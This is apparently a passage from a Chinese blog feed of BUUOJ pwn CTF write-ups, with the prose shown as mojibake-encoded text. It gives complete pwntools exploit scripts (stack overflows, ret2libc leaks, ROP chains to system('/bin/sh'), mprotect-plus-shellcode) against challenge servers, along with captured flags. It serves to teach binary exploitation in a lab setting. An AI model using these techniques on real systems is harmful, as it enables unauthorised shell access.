ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23(2).so&#x27;</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># main_addr = elf.symbols[&#x27;main&#x27;]</span></span><br><span class="line"><span class="comment"># print(hex(write_plt),hex(write_got),hex(main_addr))</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">6</span> + <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),write_plt,main_addr,<span class="number">1</span>,write_got,<span class="number">4</span>])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># print(r.recv(4))</span></span><br><span class="line">libc_write = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_write))</span><br><span class="line">libc_base = libc_write - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload3 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),libc_system,<span class="number">0xdead</span>,bin_sh_addr])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>))</span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¡äº†å¥½ä¹…ï¼Œå‘ç°æ˜¯libcç‰ˆæœ¬é—®é¢˜ï¼Œä¸€å¼€å§‹ä½¿ç”¨çš„æ˜¯64ä½çš„libcï¼Œåæ¥æ¢ç”¨32ä½libcæˆåŠŸæ‰“é€šã€‚<br>flagä¸º<code>flag&#123;f1dc0359-776a-4051-8b3a-072bf3782083&#125;</code></p><h2 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h2><p>å…ˆchecksec<br><img src="2022-07-30%20221500.jpg" alt="checksec"><br>æœ‰ä¸€ä¸ªå°å§¿åŠ¿æ˜¯linuxä¸‹<code>file</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p><img src="2022-07-30%20221704.jpg" alt=""><br>è¿™ä¸ªæ–‡ä»¶æ˜¯é™æ€é“¾æ¥çš„<br>ä¸è¿‡åœ¨æ­¤é¢˜ä¸­æ²¡å¤ªå¤§ç”¨ï¼ˆåªæ˜¯çœ‹åˆ°IDAé‡Œé¢ä¸€å †å‡½æ•°ï¼Œå¿ƒè¡€æ¥æ½®çœ‹ä¸€ä¸‹ï¼‰<br><img src="2022-07-30%20222232.jpg" alt="IDA main"><br>mainå‡½æ•°ä¸­getså‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºã€‚<br><img src="2022-07-30%20222432.jpg" alt="IDA get_flag"><br>get_flagé‡Œå¯ä»¥è¯»å–flag.txtæ–‡ä»¶å†…å®¹ï¼Œåªè¦æ»¡è¶³a1,a2å˜é‡çš„æ¡ä»¶å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"><span class="comment"># print(hex(get_flag_addr))</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">dead = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>) + p32(get_flag_addr) + p32(dead) + p32(a1) +p32(a2)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€ payloadæ—¶å¾ˆå¤šæ—¶å€™éƒ½ä¸ä¼šè€ƒè™‘åˆ°ç¨‹åºé€€å‡ºçš„é—®é¢˜ã€‚<br>å› ä¸ºæˆ‘ä»¬è°ƒç”¨systemå‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šå…ˆè°ƒç”¨fork()åˆ›å»ºå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è°ƒç”¨/bin/sh-c stringæ¥æ‰§è¡Œå‚æ•°stringå­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ‰§è¡Œå®Œåéšå³è¿”å›åŸè°ƒç”¨çš„è¿›ç¨‹ã€‚æˆ‘ä»¬é€šå¸¸çš„æ‹¿shellæ–¹å¼æ˜¯è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ˆåŒ…æ‹¬system(),execve()ç­‰å‡½æ•°ï¼‰ï¼Œæ­¤æ—¶æ˜¯æˆ‘ä»¬ä¸æ“ä½œç³»ç»Ÿåˆ›å»ºçš„å­è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œé€šå¸¸å¯ä»¥æ­£å¸¸å¾—åˆ°å›æ˜¾çš„ç»“æœï¼Œæ‹¿åˆ°ç»“æœï¼Œè¿”å›ç¨‹åºè¿›ç¨‹åï¼Œå¦‚æœæˆ‘ä»¬payloadç»™å‡ºçš„æ˜¯ä¸€ä¸ªæ— æ•ˆè¿”å›åœ°å€ï¼Œç¨‹åºä¼šå´©æºƒé€€å‡ºï¼Œä½†æ­¤æ—¶å·²ç»ä¸æˆ‘ä»¬æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ã€‚<br>ä½†æœ¬é¢˜ä¸ä¸€æ ·ï¼Œå¦‚æœæœ¬é¢˜æ— æ³•æ­£å¸¸é€€å‡ºï¼Œæˆ‘ä»¬å°±æ‹¿ä¸åˆ°è¿”å›ç»“æœã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨exitå‡½æ•°ï¼Œè®©ç¨‹åºæ­£å¸¸é€€å‡ºã€‚<br>flagä¸º<code>flag&#123;8ce19758-b912-4823-a0ff-6e86353b8d9b&#125;</code></p><p>åœ¨ç½‘ä¸Šçœ‹åˆ°å¦ä¸€ç§æ–¹æ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°å¡«çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œæ˜¯æŒ‡éœ€è¦è¿›è¡Œæ“ä½œçš„åœ°å€ã€‚<br>ç¬¬äºŒä¸ªå‚æ•°æ˜¯åœ°å€å¾€åå¤šå¤§çš„é•¿åº¦ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ˜¯è¦èµ‹äºˆçš„æƒé™ã€‚<br>mprotect()å‡½æ•°æŠŠè‡ªstartå¼€å§‹çš„ã€é•¿åº¦ä¸ºlençš„å†…å­˜åŒºçš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸ºprotæŒ‡å®šçš„å€¼ã€‚(ä½œç”¨æ¯”è¾ƒç±»ä¼¼äºåœ¨é€†å‘hookéƒ¨åˆ†æåˆ°çš„virtualprotect())<br>æˆ‘ä»¬å¯ä»¥å°†ä¸€æ®µå†…å­˜è®¾å®šä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åç”¨ret2shellcodeçš„æ‰‹æ³•ï¼Œå°†shellcodeå†™å…¥è¯¥æ®µå†…å­˜ï¼Œä»è€Œæ‰§è¡Œshellcodeæ‹¿shellã€‚(prot = 7)<br>æŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆlinuxä¸­ä¸€èˆ¬ä¸º4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚<br>è‡³äºå¦‚ä½•å°†shellcodeå†™å…¥å†…å­˜æŒ‡å®šä½ç½®ï¼Œä½¿ç”¨read()å³å¯å°†æŒ‡å®šé•¿åº¦çš„å­—ç¬¦å†™å…¥ä»¥ç»™å®šåœ°å€å¼€å§‹çš„ä¸€æ®µå†…å­˜ä¸­ã€‚è¿™ä¹Ÿæ˜¯å¸¸è§æ‰‹æ³•ã€‚<br>pwntoolsè‡ªå¸¦çš„<code>shellcrft.sh()</code>å¯ä»¥ç”Ÿæˆ<code>system('/bin/sh')</code>çš„æœºå™¨ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># expæ˜¯ç½‘ä¸Šæ‰¾åˆ°ç°æˆçš„</span></span><br><span class="line">q = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line"><span class="comment">#q = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">pop_3_ret = <span class="number">0x0804f460</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">q.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">q.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯æˆ‘è‡ªå·±å°è¯•ä½¿ç”¨çš„ï¼Œæ—¢ç„¶è¿™é‡Œç¦æ‰äº†system()ï¼Œé‚£ä¹ˆæˆ‘è¿˜å¯ä»¥ç›´æ¥è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°execveæ‹¿shellï¼Œæˆ‘åªéœ€è¦æ„é€ gadgetç»™eax,ebx,ecx,edxèµ‹å€¼å³å¯ï¼Œå†è°ƒç”¨ä¸­æ–­æŒ‡ä»¤è°ƒç”¨ç³»ç»Ÿå‡½æ•°ã€‚æœ¬é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œå¯»æ‰¾åˆé€‚çš„gadgetå¾ˆå®¹æ˜“ã€‚ç¼ºå°‘â€™/bin/shâ€™å¯ä»¥ç”¨â€™shâ€™æ›¿ä»£ã€‚å¯æƒœæ²¡æœ‰æˆåŠŸã€‚</p><h2 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h2><p>ä¸jarvisoj_level2ç±»ä¼¼ï¼Œåªæ˜¯æ–‡ä»¶æ˜¯x64ã€‚<br>x86å’Œx64ä¸€ä¸ªä¸»è¦åŒºåˆ«æ˜¯ä¼ å‚æ–¹å¼ä¸åŒã€‚<br>å…ˆchecksec<br>å¤§ä½“æ€è·¯ä¸jarvisoj_level2ç±»ä¼¼ï¼Œåªæ˜¯ç»™systemå‡½æ•°ä¼ å‚æ—¶ï¼Œè¦å°†å‚æ•°ä¼ ç»™rdiï¼Œæ‰€ä»¥éœ€è¦å¯»æ‰¾<code>pop rdi|ret</code>çš„gadgetã€‚<br>ç›´æ¥æ”¾è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25081</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2_x64&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;8ae1b539-6038-46c4-a4bf-e12a20e3fbb8&#125;</code></p><h2 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h2><p>å…ˆchecksec<br>mainå‡½æ•°<br><img src="2022-07-30%20232629.jpg" alt="IDA"><br>isoc99_scanf()æœªé™åˆ¶è¾“å…¥é•¿åº¦ï¼Œä¼šé€ æˆæ ˆæº¢å‡ºã€‚ï¼ˆå¯ä»¥ç®€ç®€å•å•æµ‹è¯•ä¸€æ³¢ï¼Œè¾“å…¥ä¸€æ®µå¾ˆé•¿çš„æ•°æ®ä¼šå‡ºç°æ®µé”™è¯¯ï¼‰ã€‚<br>systemå’Œâ€™/bin/shâ€™éƒ½æœ‰ï¼Œå¯ä»¥å¿«å¿«ä¹ä¹çš„æ‹¿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi_ret, bin_sh_addr, system_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellåéœ€è¦åœ¨é¶æœºæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¯»æ‰¾flagã€‚ä¸€èˆ¬ç”¨æˆ·æ–‡ä»¶æ”¾åœ¨homeç›®å½•ä¸‹ï¼Œè¿›home/babyropç›®å½•å¯ä»¥æ‰¾åˆ°flagã€‚ï¼ˆä¸€å¼€å§‹æˆ‘ä»¥ä¸ºbabyropæ˜¯æˆ‘ä»¬æ‹¿åˆ°çš„ç¨‹åºï¼Œè¢«éª—äº†ï¼‰ã€‚<br>ç›´æ¥<code>find -name flag</code>æ¯”è¾ƒæ–¹ä¾¿ã€‚<br>flagä¸º<code>flag&#123;e9a771df-0b2a-4320-af06-3c5635d6aa20&#125;</code></p><h2 id="ciscn-2019-en-2">ciscn_2019_en_2</h2><p>IDAåˆ†æåå‘ç°å’Œä¹‹å‰çš„ciscn_2019_c_1å¥½åƒæ˜¯ä¸€æ ·ã€‚<br>æœ€ç¦»è°±çš„æ˜¯æˆ‘ä»…ä¿®æ”¹äº†ä¹‹å‰çš„expçš„ç«¯å£å·ï¼Œç«Ÿç„¶å°±æ‰“é€šäº†â€¦â€¦</p><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><p>å…ˆchecksec<br>IDAä¸­æœ‰å‡½æ•°å’Œget_secretå‡½æ•°<br><img src="2022-07-31%20203607.jpg" alt=""><br><img src="2022-07-31%20203642.jpg" alt=""><br>mainå‡½æ•°ä¸­getså‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œget_secretå‡½æ•°ä¸­è¯»å–äº†flag.txtæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¹¶å­˜å…¥fl4gä¸­ï¼Œfl4gä½äºbssæ®µã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŠ«æŒç¨‹åºæµæ‰§è¡Œåˆ°get_secretå‡½æ•°ã€‚åˆç”±äºget_secretæ— æ³•ç›´æ¥æ‰“å°flagï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨printfç­‰å…·æœ‰æ‰“å°åŠŸèƒ½çš„å‡½æ•°ï¼Œè¿™é‡Œé€‰ç”¨printfã€‚<br>å’Œå‰é¢get_started_3dsctf_2016ä¸€æ ·ï¼Œæˆ‘ä»¬çš„ç¨‹åºéœ€è¦æ­£å¸¸é€€å‡ºæ‰æœ‰å›æ˜¾ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°exitå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29107</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag = elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]</span><br><span class="line">exit_addr = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">flag = elf.symbols[<span class="string">&#x27;fl4g&#x27;</span>]</span><br><span class="line">printf_addr = elf.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>, get_flag, printf_addr, exit_addr, flag, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;m3m0... &#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜å¦ä¸€ä¸ªæ–¹æ³•ä¸æ€è·¯get_started_3dsctf_2016ä¸€æ ·ã€‚<br>flagä¸º<code>flag&#123;94dd8687-184a-40cd-8f6f-b4cbf0dc553f&#125;</code></p><h2 id="ciscn-2019-n-5">ciscn_2019_n_5</h2><p>checksecï¼Œå­˜åœ¨å¯å†™å¯æ‰§è¡Œæ®µã€‚<br><img src="2022-07-31%20204203.jpg" alt=""><br><img src="2022-07-31%20204339.jpg" alt=""><br>mainå‡½æ•°ä¸­é¦–å…ˆè¯»å…¥å­—ç¬¦ä¸²å­˜å…¥nameä¸­ï¼Œnameä½äºbssæ®µï¼Œç„¶ågetså‡½æ•°è¯»å…¥v4ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚<br>ç¬¬ä¸€ä¸ªæ€è·¯æ˜¯å‘bssæ®µå†™å…¥shellcodeï¼Œç„¶ååŠ«æŒç¨‹åºæ‰§è¡Œæµæ‰§è¡Œshellcodeã€‚<br><img src="2022-07-31%20204731.jpg" alt=""><br>é¦–å…ˆå‘nameå‘é€shellcodeï¼Œåœ¨getså‡½æ•°ä¸­éœ€è¦å†™å…¥çš„å¡«å……æ•°æ®é•¿åº¦ä¸º0x28å­—èŠ‚ï¼Œå’Œnameçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25356</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_n_5&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;?\n&#x27;)</span></span><br><span class="line">shellcode_addr = elf.symbols[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>, shellcode_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ç±»ä¼¼äºret2libcï¼Œå…ˆæ³„éœ²å‡½æ•°åœ°å€ï¼Œè¾“å‡ºï¼Œå†è¿”å›mainå‡½æ•°ï¼Œè°ƒç”¨systemå‡½æ•°æ‹¿shellï¼Œä¸è¿‡æ²¡æœ‰æ‹¿åˆ°å›æ˜¾åœ°å€ï¼Œæ²¡æœ‰æ‰“æˆã€‚</p><p>flagä¸º<code>flag&#123;aad9d677-0040-44b9-8eec-978bde7f8360&#125;</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 1</title>
      <link href="/2022/07/buuoj-pwn-wp1/"/>
      <url>/2022/07/buuoj-pwn-wp1/</url>
      
        <content type="html"><![CDATA[<p>æŒç»­æ›´æ–°<br>ç›¸å…³çŸ¥è¯†ä¼šæ›´æ–°åœ¨å…¶ä»–æ–‡ç« ä¸­ã€‚</p><h2 id="test-your-nc">test_your_nc</h2><p>å…ˆchecksecï¼Œæ˜¯64ä½ç¨‹åºï¼Œæ‹–å…¥IDAã€‚</p><p>mainå‡½æ•°æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚åŒåå­—ä¸€æ ·ï¼Œç›´æ¥ä½¿ç”¨ncè¿›è¡Œè¿æ¥ï¼Œæˆ–è€…ç¼–å†™è„šæœ¬è¿›è¡Œè¿æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28795</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./test&#x27;)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥ç›´æ¥æ‹¿shellï¼Œ<code>ls</code> + <code>cat flag</code>æå®š<br>flagä¸º<code>flag&#123;dd3017eb-3297-48de-a5e4-799b37b9e81a&#125;</code></p><h2 id="rip">rip</h2><p>æ€è·¯ç±»ä¼¼äºret2text<br>å…ˆchecksecï¼Œæ˜¯64ä½ç¨‹åºï¼Œä¸”åŸºæœ¬æ²¡æœ‰ä¿æŠ¤ã€‚IDAåˆ†æ</p><p>å…¶ä¸­mainå‡½æ•°ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>funå‡½æ•°å¯èƒ½æ˜¯è‡ªå·±å†™çš„ï¼Œè¿›å»çœ‹çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>funå‡½æ•°æ˜¯åé—¨å‡½æ•°ï¼Œåªéœ€è¦å°†ç¨‹åºæ‰§è¡ŒæµåŠ«æŒåˆ°funå‡½æ•°å³å¯ã€‚<br>mainå‡½æ•°ä¸­getså‡½æ•°æ˜¯å±é™©å‡½æ•°ï¼Œå¯ä»¥å‘ç”Ÿæ 